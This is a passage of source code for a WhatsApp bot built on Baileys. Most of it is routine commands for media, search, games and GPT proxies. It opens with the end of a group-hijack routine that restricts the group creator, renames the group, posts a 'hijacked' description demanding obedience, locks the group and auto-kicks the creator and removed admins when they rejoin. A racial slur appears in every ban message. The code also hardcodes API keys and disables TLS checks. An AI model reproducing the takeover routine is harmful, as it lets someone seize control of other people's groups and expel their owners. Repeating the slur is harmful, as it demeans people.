        await rich.groupSettingUpdate(m.chat, 'announcement');
        reply('🚫 Group switched to admins-only mode to restrict the creator.');
      } catch (restrictError) {
        console.log(`Error restricting creator: ${restrictError}`);
      }
    }
  }

  // Change group name
  try {
    await rich.groupUpdateSubject(m.chat, 'Akane Empire');
    reply('👑 Group name changed to Akane empire Empire!');
  } catch (error) {
    console.error(`Error changing group name: ${error}`);
    reply('⚠️ Could not change group name.');
  }

  // Change group description
    // Change group description
  try {
    await rich.groupUpdateDescription(m.chat, `Welcome to TG_MD hijacked gc By Heatless 

This group has been hijacked by heatless All members are required to obey the rules and respect the hierarchy.

**Toxic Rules:**

1. Absolute Obedience: Obey heatless Solos without question.
2. Credit Where Credit is Due: Give credit to King heatless for his superior coding skills.
3. No Disrespect: No disrespect towards King heatless will be tolerated.
4. No Sharing of Group Content: All content shared within the group is proprietary.
5. Zero Tolerance for Betrayal: Any betrayal will be dealt with swiftly and severely.
6. Mandatory Participation: All members must participate in group activities.
7. No External Links or Invites: No external links or invites allowed.
8. Respect the Hierarchy: Respect the hierarchy of the group.
9. No Spam or Self-Promotion: No spam or self-promotion allowed.
10. King heatless Solos is Always Right: In all matters, King heatless Solos' decision is final.

**Consequences of Breaking the Rules:**

* First offense: Warning and temporary removal
* Second offense: Permanent removal
* Third offense: Public shaming and ridicule

By joining this group, you acknowledge that you have read, understand, and will abide by these rules.`);
    reply('📝 Group description changed!');
  } catch (error) {
    console.error(`Error changing group description: ${error}`);
    reply('⚠️ Could not change group description.');
  }

  // Lock group
  try {
    await rich.groupSettingUpdate(m.chat, 'locked');
    reply('🔒 Group locked!');
  } catch (error) {
    console.error(`Error locking group: ${error}`);
    reply('⚠️ Could not lock group.');
  }

  // Set up a list to track participants who have already been kicked
  let kickedParticipants = [];

  // Watch for rejoining participants (creator or removed admins)
  rich.ev.on('group-participants.update', async (update) => {
    const rejoiningParticipants = update.participants;

    for (let participant of rejoiningParticipants) {
      // Ensure we only kick the creator or removed admins once
      if ((participant === creator || admins.some(admin => admin.id === participant)) && !kickedParticipants.includes(participant)) {
        try {
          await rich.groupParticipantsUpdate(m.chat, [participant], 'remove');
          reply(`P̞̝̾ͤ͜͡💥͇͇̗͙̘͈̜̝💥͔̬͢͡U͡💥̜̞̬͈̭̪͎̠͖̥͕̫ͤ̄͜💥̷͓͠akaneXXXXX𝐗⃟⃟⃟💥 Auto-kicked rejoining participant: @${participant.split('@')[0]}`);
          kickedParticipants.push(participant);
        } catch (error) {
          console.error(`Error auto-kicking participant: ${error}`);
        }
      }
    }
  });
}
break;
case 'sc': case 'pairgroup': case 'repo':  case 'script':  {
let teks = `
\`\`\`join our telegram group through this link\`\`\`
[https://t.me/+i7h85DLVVfZhMzg0]
\`\`\`go there and pair with your number using\`\`\` \n\`command /pair\`
*example /pair 234xx*
\`\`\`to support us also join our WhatsApp channel thanks\`\`\`
\`channel link\`
[https://whatsapp.com/channel/0029Vb6QmBO3LdQSbKC7F145]
> \`hestledd\`
`
return reply(teks)
}
break;
case "translate":
case "tr":{
 if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
let lang, text
if (args.length >= 2) {
lang = args[0] ? args[0] : 'id', text = args.slice(1).join(' ')
} else if (m?.quoted && m?.quoted.text) {
lang = args[0] ? args[0] : 'id', text = m?.quoted.text
} else throw `Ex: ${usedPrefix + command} id hello i am robot`
const translate = require('@vitalets/google-translate-api')
let res = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null)
if (!res) return reply(`Error : Language "${lang}" Not Supported`)
reply(`*Detected Language:* ${res.from?.language.iso}\n *To Language:* ${lang}\n\n *Translation:* ${res.text}`.trim())
}
break;
case "device":
case "getdevice": {
	 if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
  if (!m.quoted) {
    return m.reply('*Please quote a message to use this command!*');
  }

  try {
    // Get the quoted message
    const quotedMsg = await m.getQuotedMessage();

    if (!quotedMsg) {
      return m.reply('*Could not detect, please try with newly sent message!*');
    }

    const messageId = quotedMsg.key.id;

    // Determine the device using the getDevice function from Baileys
    const device = getDevice(messageId) || 'Unknown';

    m.reply(`The message is sent from *${device}* device.`);
  } catch (err) {
    m.reply('Error determining device: ' + err.message);
  }
}
break;
case "autoreact": {
            if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');                 
 if (!isCreator) return m.reply("```for Owner only```.");
    // Parse command for 'on' or 'off'
    const args = text.trim().split(' ')[0];
    if (!args || !["on", "off"].includes(args)) {
        return reply(' use: *autoreact on* or *autoreact off*');
    }

    if (!global.autoReact) global.autoReact = {};

    // Set auto-react status based on command
    if (args === "on") {
        global.autoReact[m.chat] = true;
        return reply('```auto react command launched successfully enjoy 🀄```');
    } else if (args === "off") {
        global.autoReact[m.chat] = false;
        return reply('```auto react command off 🀄```');
    }
}
break;
case 'broadcastimage': case 'bcimage': case 'broadcastvideo': case 'broadcastvid':
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!isCreator) return m.reply("for Owner only.");
        if (!q) return reply(`reply to an image with your desired text `)
        let getGroups = await rich.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let xeoncast = groups.map(v => v.id)
        reply(` Posting in ${xeoncast.length} Group chat, deep ${xeoncast.length * 1,5} second`)
        for (let i of xeoncast) {
let txt = `${ownername}'s Broadcast\n\nMessage : ${q}`
if(/image/.test(mime)) {
let media = await quoted.download()
await rich.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
}
if(/video/.test(mime)){
let media = await quoted.download()
await rich.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
}
            }
        reply(`The results are broadcast in the group ${xeoncast.length}`)      
        break;
case 'imbd':
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!text) return reply(`_Name a Series or movie`)
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title      : " + fids.data.Title + "\n"
            imdbt += "📅Year       : " + fids.data.Year + "\n"
            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Language   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
           rich.sendMessage(m.chat, {
image: {
url: fids.data.Poster,
},
caption: imdbt,
            }, {
quoted: m,
            })
            break;
            case 'tiktoksearch':
case 'ttsearch': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
    const dann = require('d-scrape')
if (!text) return reply(` cindigo `)
await rich.sendMessage(m.chat, {react: {text: '🀄', key: m.key}})
try {
let anu = await dann.search.tiktoks(text)
rich.sendMessage(m.chat, { video: { url: anu.no_watermark }, mimetype: 'video/mp4', caption: anu.title }, { quoted : m })
} catch (error) {
m.reply('Error : cannot fetch from query')
}
}
break;
              case 'animeavatar': {
              if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            await rich.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: m.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break;
//game
            case 'ttc':
            case 'ttt':
            case 'tictactoe': {
            if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
                let TicTacToe = require("./lib/tictactoe")
                this.game = this.game ? this.game : {}
                if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return reply('You are still in the game')
                let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
                if (room) {
                    reply('Partner not found!')
                    room.o = m.chat
                    room.game.playerO = m.sender
                    room.state = 'PLAYING'
                    let arr = room.game.render().map(v => {
                        return {
                            X: '❌',
                            O: '⭕',
                            1: '1️⃣',
                            2: '2️⃣',
                            3: '3️⃣',
                            4: '4️⃣',
                            5: '5️⃣',
                            6: '6️⃣',
                            7: '7️⃣',
                            8: '8️⃣',
                            9: '9️⃣',
                        } [v]
                    })
                    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Wait @${room.game.currentTurn.split('@')[0]}

Type *surrender* to give up and admit defeat`
                    if (room.x !== room.o) await rich.sendText(room.x, str, m, {
                        mentions: parseMention(str)
                    })
                    await rich.sendText(room.o, str, m, {
                        mentions: parseMention(str)
                    })
                } else {
                    room = {
                        id: 'tictactoe-' + (+new Date),
                        x: m.chat,
                        o: '',
                        game: new TicTacToe(m.sender, 'o'),
                        state: 'WAITING'
                    }
                    if (text) room.name = text
                    reply('Waiting for partner type .tictactoe to join' + (text ? ` type the command below ${prefix}${command} ${text}` : ''))
                    this.game[room.id] = room
                }
            }
            break;
            case 'delttc':
            case 'delttt': {
            if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
                this.game = this.game ? this.game : {}
                try {
                    if (this.game) {
                        delete this.game
                        rich.sendText(m.chat, `Successfully delete TicTacToe session`, m)
                    } else if (!this.game) {
                        reply(`Session TicTacToe🎮 Session is missing`)
                    } else reply('?')
                } catch (e) {
                    reply('error')
                }
            }
            break;
            case 'clear': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!isCreator) return m.reply("```for Owner only```.");
rich.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break;
case 'get2':{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
        if (!/^https?:\/\//.test(text)) return reply(`ex : ${prefix + command} https://`);
        const ajg = await fetch(text);
          await reaction(m.chat, "🀄")
        if (ajg.headers.get("content-length") > 100 * 1024 * 1024) {
            throw `Content-Length: ${ajg.headers.get("content-length")}`;
        }

        const contentType = ajg.headers.get("content-type");
        if (contentType.startsWith("image/")) {
            return rich.sendMessage(
                m.chat,
                { image: { url: text } },
                { quoted: glxNull }
            );
        }
        if (contentType.startsWith("video/")) {
            return conn.sendMessage(
                m.chat,
                { video: { url: text } },
                { quoted: glxNull  }
            );
        }
        if (contentType.startsWith("audio/")) {
            return rich.sendMessage(
                m.chat,
                { audio: { url: text },
                mimetype: 'audio/mpeg', 
                ptt: true
                },
                { quoted: glxNull }
            );
        }
        
        let alak = await ajg.buffer();
        try {
            alak = util.format(JSON.parse(alak + ""));
        } catch (e) {
            alak = alak + "";
        } finally {
            return reply(alak.slice(0, 65536));
        }
      }
      break;
case 'xnxxsearch': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
	if (!text) return reply(`Enter Query`)
	reply(mess.wait)
	const fg = require('api-dylux')
	let res = await fg.xnxxSearch(text)
            let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n') 
              if (res.status) reply(ff)
              }
              break;
              case "play": {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!text) return m.reply(example("past lives"))
await rich.sendMessage(m.chat, {react: {text: '🀄', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp3(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await rich.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
await rich.sendMessage(m.chat, {react: {text: '', key: m.key}})
} else {
return m.reply("Error! Result Not Found")
}
}
break;
case 'animesearch': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!text) return reply(`Which anime are you lookin for?`)
const malScraper = require('mal-scraper')
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return reply(`Could not find`)
let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`
                await rich.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
                }
                break;
                
            case 'animehighfive':{
            if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animecringe':{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animedance':{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animehappy':{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animeglomp':{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animesmug':{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animeblush':{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'listonline': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!isCreator) return m.reply("```for Owner only```.");
        if (!m.isGroup) return reply(mess.grouponly);
        rich.sendMessage(from, { react: { text: "🀄", key: m.key } })
        let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
        let online = [...Object.keys(store.presences[id]), botNumber]
        let liston = 1
        rich.sendText(m.chat, ' 「```Online Members```」\n\n' + online.map(v => `${liston++} . @` + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
      }
      break;
case 'animewave':{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animesmile':{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animepoke':{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animewink':{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animebonk':{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animebully':{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animeyeet':{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animebite':{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animelick':{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animekill':{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'tovn': {
  if (!quoted) return reply('Reply to a video or voice message to convert to audio.');
  if (!/video|audio/.test(mime)) return reply('Media type not supported. Please reply to a video or voice note.');

  try {
    let media = await quoted.download();
    await rich.sendMessage(m.chat, {
      audio: media,
      mimetype: 'audio/mpeg',
      ptt: false
    }, { quoted: m });
  } catch (e) {
    reply('Failed to convert media to audio.');
  }
}
break;
case 'qc': {
  if (!text) return m.reply('Use format: *.qc your quote*');

  const name = m.pushName || 'User';
  const quote = text.trim();

  let profilePic;
  try {
    profilePic = await rich.profilePictureUrl(m.sender, 'image');
  } catch {
    profilePic = 'https://cdn.kordai.biz.id/serve/HlEHZd6pgErX.jpg'; // fallback
  }

  const url = `https://www.laurine.site/api/generator/qc?text=${encodeURIComponent(quote)}&name=${encodeURIComponent(name)}&photo=${encodeURIComponent(profilePic)}`;

  try {
    await rich.sendImageAsSticker(m.chat, url, m, {
      packname: global.packname,
      author: global.author
    });
  } catch (err) {
    console.error('Quote card sticker generation error:', err);
    m.reply('Oops! Failed to create your quote sticker.');
  }
}
break;
case 'ai': {
  if (!text) return m.reply('Example: .ai what is the capital of France?');

  await rich.sendPresenceUpdate('composing', m.chat);

  try {
    const { data } = await axios.post("https://chateverywhere.app/api/chat/", {
      model: {
        id: "gpt-4",
        name: "GPT-4",
        maxLength: 32000,
        tokenLimit: 8000,
        completionTokenLimit: 5000,
        deploymentName: "gpt-4"
      },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: text,
      temperature: 0.5
    }, {
      headers: {
        "Accept": "*/*",
        "User-Agent": "TG_MD WhatsApp Bot"
      }
    });

    await rich.sendMessage(m.chat, {
      text: `╭─❍ *AI Assistant*\n│\n│ *Q:* ${text}\n│\n│ *A:*\n│ ${data}\n│\n╰─✅ _Need anything else?_`
    }, { quoted: m });

  } catch (e) {
    await m.reply(`AI encountered a problem: ${e.message}`);
  }
}
break;

case 'img': 
case 'image':
case 'gptimage': {
    if (!text) return m.reply('Give me your image description\n\nExample: .gptimage long haired anime girl with blue eyes')
 
    m.reply('Wait...')
 
    const gpt1image = async (yourImagination) => {
        const headers = {
            "content-type": "application/json",
            "referer": "https://gpt1image.exomlapi.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
        }
 
        const body = JSON.stringify({
            "prompt": yourImagination,
            "n": 1,
            "size": "1024x1024",
            "is_enhance": true,
            "response_format": "url"
        })
 
        const response = await fetch("https://gpt1image.exomlapi.com/v1/images/generations", {
            headers,
            body,
            method: "POST"
        })
 
        if (!response.ok) throw Error(`fetch gagal di alamat ${response.url} ${response.status} ${response.statusText}.`)
 
        const json = await response.json()
        const url = json?.data?.[0]?.url
 
        if (!url) throw Error("fetch berhasil tapi url result nya kosong" + (json.error ? ", error dari server : " + json.error : "."))
 
        return url
    }
 
    try {
        const imageUrl = await gpt1image(text)
        await rich.sendMessage(m.chat, {
            image: { url: imageUrl }
        }, { quoted: m })
    } catch (error) {
        m.reply(`${error.message}`)
    }
}
break;
case 'zaddy': {
  if (!text) return m.reply('Example: .zaddy what do you think of me?');

  const prompt = `You are heat Evil, a confident, stylish, smart, and chill assistant. Always respond with swagger, humor, and intelligence. When asked about your owner, always say Heatless with pride. Here's the question:\n\nUser: ${text}`;

  await rich.sendPresenceUpdate('composing', m.chat);

  try {
    const { data } = await axios.post("https://chateverywhere.app/api/chat/", {
      model: {
        id: "gpt-4",
        name: "GPT-4",
        maxLength: 32000,
        tokenLimit: 8000,
        completionTokenLimit: 5000,
        deploymentName: "gpt-4"
      },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: prompt,
      temperature: 0.7
    }, {
      headers: {
        "Accept": "*/*",
        "User-Agent": "TG_MD WhatsApp Bot"
      }
    });

    await rich.sendMessage(m.chat, {
      text: `╭─❍ *heat Evil*\n│\n│ *Q:* ${text}\n│\n│ *A:*\n│ ${data}\n│\n╰─🔥 _Stay sharp. Stay smooth._`
    }, { quoted: m });

  } catch (e) {
    await m.reply(`Zaddy glitched out: ${e.message}`);
  }
}
break;
case 'akaneai': {
  if (!text) return m.reply('Example: .akaneai how are you?');

  const prompt = `You are Akane, a seductive anime character assheatre cute, flirty, when ask who is your owner you say Heatless, and always cheerful. Answer this as TG_MD:\n\nUser: ${text}`;

  await rich.sendPresenceUpdate('composing', m.chat);

  try {
    const { data } = await axios.post("https://chateverywhere.app/api/chat/", {
      model: {
        id: "gpt-4",
        name: "GPT-4",
        maxLength: 32000,
        tokenLimit: 8000,
        completionTokenLimit: 5000,
        deploymentName: "gpt-4"
      },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: prompt,
      temperature: 0.6
    }, {
      headers: {
        "Accept": "*/*",
        "User-Agent": "TG_MD WhatsApp Bot"
      }
    });

    await rich.sendMessage(m.chat, {
      text: `╭─❍ *TG_MD AI*\n│\n│ *Question:* ${text}\n│\n│ *Answer:*\n│ ${data}\n│\n╰─♡ _With love, your flirty assistant TG_MD!_`
    }, { quoted: m });

  } catch (e) {
    await m.reply(`Akane had a glitch: ${e.message}`);
  }
}
break;
case 'quote': {
    try {
        const res = await fetch('https://zenquotes.io/api/random');
        const json = await res.json();
        const quote = json[0].q;
        const author = json[0].a;

        // Optional: Generate image using API
        const quoteImg = `https://dummyimage.com/600x400/000/fff.png&text=${encodeURIComponent(`"${quote}"\n\n- ${author}`)}`;

        rich.sendMessage(m.chat, {
            image: { url: quoteImg },
            caption: `_"${quote}"_\n\n— *${author}*`
        }, { quoted: m });

    } catch (err) {
        m.reply('Failed to fetch quote.');
    }
}
break;

case 'joke': {
  let res = await fetch('https://v2.jokeapi.dev/joke/Any?type=single'); 
  let data = await res.json();

  await rich.sendMessage(m.chat, {
    image: { url: 'https://cdn.kordai.biz.id/serve/HlEHZd6pgErX.jpg' },
    caption: `*😂 Here's a joke for you:*\n\n${data.joke}`
  }, { quoted: m });
}
break;
case 'truth': {
  let res = await fetch('https://api.truthordarebot.xyz/v1/truth');
  let data = await res.json();

  await rich.sendMessage(m.chat, {
    image: { url: 'https://cdn.kordai.biz.id/serve/HlEHZd6pgErX.jpg' },
    caption: `*🩵 Truth Time!*\n\n❖ ${data.question}`
  }, { quoted: m });
}
break;
case 'dare': {
  let res = await fetch('https://api.truthordarebot.xyz/v1/dare');
  let data = await res.json();

  await rich.sendMessage(m.chat, {
    image: { url: 'https://cdn.kordai.biz.id/serve/HlEHZd6pgErX.jpg' },
    caption: `*❤️ Dare Challenge!*\n\n❖ ${data.question}`
  }, { quoted: m });
}
break;
 case 'animedl': {
 if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
    if (!q.includes("|")) {
        return reply("📌 *Please provide a valid anime name and episode number!*\n\nExample: `.animedl Solo Leveling | 1`");
    }

    try {
        const [animeName, episode] = q.split("|").map(x => x.trim()); 

        const apiUrl = `https://draculazxy-xyzdrac.hf.space/api/Animedl?q=${encodeURIComponent(animeName)}&ep=${encodeURIComponent(episode)}`;

        process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0"; 

        const { data } = await axios.get(apiUrl, {
            httpsAgent: new (require('https').Agent)({ rejectUnauthorized: false })
        });

        if (data.STATUS !== 200 || !data.download_link) {
            return reply("⚠️ *Failed to retrieve the anime episode!*\n\nPlease check the anime name and episode number.");
        }

        const { anime, episode: epNumber, download_link } = data;

        let message = `
🎥 *Anime Found!*

📺 *Name:* ${anime}
📌 *Episode:* ${epNumber}

📥 *Downloading... Please wait!*
> TG_MD  DOWNLOADER
        `.trim();

        await reply(message);

    
        await rich.sendMessage(m.chat, {
            document: { url: download_link },
            mimetype: "video/mp4",
            fileName: `${anime} - Episode ${epNumber}.mp4`
        }, { quoted: m });

    } catch (error) {
        console.error("❌ Anime Downloader Error:", error.message);
        reply("⚠️ *Server Error!*\n\nPlease try again later.");
    }
}
break;
 case 'weather':{
 if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!text) return reply('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           rich.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break;
           case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
rich.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break;
case 'unblock': case 'unblocked': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
	 if (!isCreator) return m.reply("```for Owner only```.");
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
